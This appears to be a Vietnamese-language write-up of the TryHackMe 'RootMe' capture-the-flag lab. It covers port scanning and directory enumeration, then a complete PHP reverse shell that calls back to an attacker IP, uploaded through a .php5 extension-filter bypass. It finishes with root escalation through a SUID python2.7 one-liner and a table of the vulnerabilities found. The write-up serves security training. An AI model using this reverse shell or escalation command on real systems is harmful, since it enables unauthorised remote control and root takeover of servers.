---
title: "TryHackMe - RootMe"
author: Thien Nguyen
date: "2026-07-02"
subject: "CTF Writeup Template"
keywords: [THM, CTF, TryHackMe, Security, Offensive]
lang: "vi"

---

# Recon
## Nmap
```bash
└─$ sudo nmap -sC -sV -sS --reason -oA recon_nmap 10.49.170.108                    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-01 09:59 EDT
Nmap scan report for 10.49.170.108
Host is up, received reset ttl 62 (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ac:37:95:be:f6:7f:42:6b:f0:2c:bb:2e:86:c6:81:7f (RSA)
|   256 8e:31:47:57:61:79:de:6a:e5:db:37:13:55:21:59:b6 (ECDSA)
|_  256 b2:ee:ed:b7:d4:6f:1c:49:61:79:39:45:e4:26:fa:bd (ED25519)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds
```

| port    | service     | version                                                       |
| ------- | ----------- | ------------------------------------------------------------- |
| 22      | ssh         | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0) |
| 80      | http        | Apache httpd 2.4.41 ((Ubuntu))                                |
# Enumeration
## gobuster
### dir
```bash
└─$ sudo gobuster dir -u http://10.49.170.108/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster_directionary.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.170.108/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.49.170.108/css/]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 311] [--> http://10.49.170.108/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.49.170.108/panel/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://10.49.170.108/uploads/]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```
## Web Application Enumeration
- Đây là trang chủ của target
![](../../05-Assets/Pasted%20image%2020260701212158.png)
- Giờ chúng ta sẽ check từng dir và gobuster đã cung cấp đầu tiên là panel thì chúng ta có thể thấy đây là nơi có thể upload 1 file shell lên để thực thi reverse shell
![](../../05-Assets/Pasted%20image%2020260701212311.png)
- Tiếp theo là uploads, ở đây là nơi lưu các file mà chúng ta upload lên
![](../../05-Assets/Pasted%20image%2020260702211934.png)
- Tiếp theo là js thì đây file chứa 1 hàm in chữ ở bên trang chủ
![](../../05-Assets/Pasted%20image%2020260701212614.png)
- css thì chứa các file css thôi
![](../../05-Assets/Pasted%20image%2020260701212649.png)
# Exploitation  
- Oke giờ chúng ta sẽ tạo 1 file php shell để thử tạo reverse shell trên target 
- Code php reverse shell
```php
<?php
// php_reverse_shell.php
$ip   = 'attacker_ip';
$port = port_ip;

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    die("$errstr ($errno)\n");
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin
   1 => array("pipe", "w"),  // stdout
   2 => array("pipe", "w")   // stderr
);

$process = proc_open('/bin/bash', $descriptorspec, $pipes);
if (!is_resource($process)) die("FAIL");

stream_set_blocking($pipes[1], false);
stream_set_blocking($pipes[2], false);
stream_set_blocking($sock, false);

while (true) {
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $write_a = null; $except_a = null;
    if (false === ($num_changed = stream_select($read_a, $write_a, $except_a, null))) {
        break;
    }
    if (in_array($sock, $read_a)) {
        $input = fread($sock, 8192);
        if (strlen($input) === 0) break;
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) fwrite($sock, fread($pipes[1], 8192));
    if (in_array($pipes[2], $read_a)) fwrite($sock, fread($pipes[2], 8192));
}

fclose($sock);
foreach ($pipes as $p) fclose($p);
proc_close($process);
?>
```
- Sau đó chúng ta upload file php này lên server target thì nhận lại không cho upload file php lên
![](../../05-Assets/Pasted%20image%2020260702213623.png)
- Giờ chúng ta sẽ thử File Extension Bypass ở đây ta đang dùng php nên chúng ta thử .php5(là phiên bản của php và Apache cho phép thực thi nó) để bypass việc filter này thì có thể upload lên thành công
![](../../05-Assets/Pasted%20image%2020260702214402.png)
- Giờ file đã nằm trong phần upload việc tiếp theo là tìm cách thực thi file này để triển khai reverse shell
![](../../05-Assets/Pasted%20image%2020260702214444.png)
- Dùng curl gọi file reverse shell chúng ta vừa upload lên
![](../../05-Assets/Pasted%20image%2020260702214646.png)
- Oke h chúng ta đã kết nối thành công tới server target, tiếp theo là nâng cấp shell lên
![](../../05-Assets/Pasted%20image%2020260702214718.png)
- Sử dụng lệnh sau để upgrade shell lên
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
- Upgrade xong giờ bắt đầu leo thang lên quyền root
![](../../05-Assets/Pasted%20image%2020260702214925.png)
- Trước tiên chúng ta tìm xem có file nào được cài quyền SUID(nghĩa là file đó được chạy với quyền root cho dù người chạy không phải chủ file đó) không?
```bash
www-data@ip-10-49-146-183:/home$ find / -perm /4000 2>/dev/null 
find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/bin/mount
/bin/su
/bin/fusermount
/bin/umount
```
- Có 1 cái chúng ta có thể khai thác là `/usr/bin/python2.7` chúng ta có thể dùng nó để chạy lệnh leo thang đặc quyền, vào trang gtfobins.org/gtfobins/python/ và tìm phần nơi ảnh
![](../../05-Assets/Pasted%20image%2020260702221305.png)
- Check lại id hiện tại
![](../../05-Assets/Pasted%20image%2020260702221354.png)
- Chạy lệnh sau để leo thang lên root
```python
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
- Check lại id đã chuyển sang root vậy là xong giờ chỉ cần lấy flag nữa thôi
![](../../05-Assets/Pasted%20image%2020260702221742.png)
- Flag root
![](../../05-Assets/Pasted%20image%2020260702221834.png)
# Security Issues Identified

| Vulnerability                        | Severity   | Impact |
|--------------------------------------|------------|--------|
| Unrestricted File Upload (Extension Bypass) | **Critical** | Cho phép attacker upload Web Shell (.php5) dẫn đến **Remote Code Execution (RCE)** và chiếm quyền điều khiển server |
| Insecure File Upload Handling        | High       | Không kiểm tra loại file và extension chặt chẽ, cho phép thực thi mã PHP nguy hiểm |
| Abusing SUID Binary (`python2.7`)    | High       | Cho phép user thấp (`www-data`) leo thang đặc quyền lên **root** |
| Information Disclosure               | Medium     | Có thể leak thông tin (ví dụ: đường dẫn, phiên bản phần mềm) qua các trang web |

# Conclusion
- Ở lab này chúng ta học được rằng các black list không thể bao hàm hết được tất cả các file có thể chặn, nên dùng allowed list sẽ dễ chặn các trường hợp extension bypass hơn
- Luôn kiểm tra xem có SUID nào được xét trong server không. Đây là 1 mỏ vàng vì nếu nó được xét cũng như có quyền chạy đối với user khác thì với SUID chúng ta có thể leo thang lên root được

# References
1. https://gtfobins.org/
